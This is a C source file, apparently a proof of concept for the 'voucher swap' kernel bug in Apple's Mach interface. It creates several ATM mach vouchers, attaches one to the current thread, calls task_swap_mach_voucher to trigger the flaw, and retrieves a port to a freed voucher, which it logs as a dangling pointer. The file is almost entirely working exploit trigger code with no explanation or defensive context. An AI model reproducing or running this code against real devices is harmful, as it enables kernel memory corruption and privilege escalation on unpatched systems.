//
//  voucherSwap.c
//  poc.voucherSwap
//
//  Created by Niko Tidar Lantang Perkasa on 30/01/19.
//  Copyright © 2019 Niko Tidar Lantang Perkasa. All rights reserved.
//

#include "voucherSwap.h"
#include <errno.h>
#include <sched.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach-o/loader.h>

mach_port_t begin_voucherSwap() {
    printf("[i] running....\n");
    mach_voucher_attr_recipe_data_t atm_data = {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = 510
    };
    
    mach_port_t p1 = MACH_PORT_NULL;
    kern_return_t err = KERN_FAILURE;
    printf("[i] creating mach voucher...\n");
    err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1);
    if (err != 0) {
        printf("[i] err = %d\n", err);
    }
    
    printf("[i] p1 = 0x%x\n", p1);
    sleep(1);
    mach_port_t p2 = MACH_PORT_NULL;
    printf("[i] creating mach voucher...\n");
    err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p2);
    if (err != 0) {
        printf("[i] err = %d\n", err);
    }
    
    printf("[i] p2 = 0x%x\n", p2);
    sleep(1);
    mach_port_t p3 = MACH_PORT_NULL;
    printf("[i] creating mach voucher...\n");
    err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p3);
    if (err != 0) {
        printf("[i] err = %d\n", err);
    }
    
    printf("[i] p3 = 0x%x\n", p3);
    sleep(1);
    mach_port_t p4 = MACH_PORT_NULL;
    printf("[i] creating mach voucher...\n");
    err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p4);
    if (err != 0) {
        printf("[i] err = %d\n", err);
    }
    
    printf("[i] p4 = 0x%x\n", p4);
    sleep(1);
    printf("[i] thread set mach voucher...\n");
    err = thread_set_mach_voucher(mach_thread_self(), p1);
    if (err != 0) {
        printf("[i] err = %d\n", err);
    }
    
    printf("[i] p2 = 0x%x\n", p2);
    sleep(3);
    printf("[i] task swap mach voucher...\n");
    err = task_swap_mach_voucher(mach_task_self(), p1, &p3);
    if (err != 0) {
        printf("[i] err = %d\n", err);
    }
    
    printf("[i] p3 = 0x%x\n", p3);
    sleep(1);
    printf("[i] obtaining dangling pointer...\n");
    mach_port_t real_port_to_fake_voucher = MACH_PORT_NULL;
    err = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher);
    printf("[+] the real_port_to_fake_voucher is 0x%x\n", real_port_to_fake_voucher);
    sleep(1);
    return real_port_to_fake_voucher;
}
